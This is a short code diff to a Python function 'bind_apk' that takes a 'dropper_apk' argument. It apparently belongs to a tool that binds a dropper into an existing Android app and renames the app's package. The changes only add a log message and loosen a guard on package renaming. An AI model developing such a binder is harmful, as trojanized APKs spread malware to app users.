@@ -1748,6 +1748,7 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
             # ET.parse can fail on manifests with BOM, unusual namespace
             # declarations, or non-UTF-8 encoding that apktool sometimes emits.
             # Fall back to raw-text regex extraction.
+            print(f"    note: ET.parse failed ({_et_err}); trying text fallback")
             try:
                 with open(target_manifest_path, 'r', encoding='utf-8', errors='replace') as _mf:
                     _manifest_raw = _mf.read()
@@ -1831,7 +1832,9 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
             # ET path failed — try raw text replacement on the manifest file.
             # This handles manifests with BOM / non-standard XML that ET can't
             # round-trip but that apktool wrote as plain text we can sed.
-            if _manifest_raw and target_package_name != "com.example.app":
+            # NOTE: no guard on target_package_name == "com.example.app" —
+            # the test APK really does use that package; we still need to rename it.
+            if _manifest_raw is not None:
                 try:
                     import re as _re
                     _patched = _manifest_raw.replace(target_package_name, new_target_package)
@@ -1842,7 +1845,7 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
                     print(f"    note: target package update failed: {_txt_err}")
                     new_target_package = target_package_name
             else:
-                print(f"    note: target package update skipped: {_et_upd_err}")
+                print(f"    note: target package update skipped (no manifest text): {_et_upd_err}")
                 new_target_package = target_package_name
 
         # purge empty smali files — apktool parser fails on 0-byte .smali
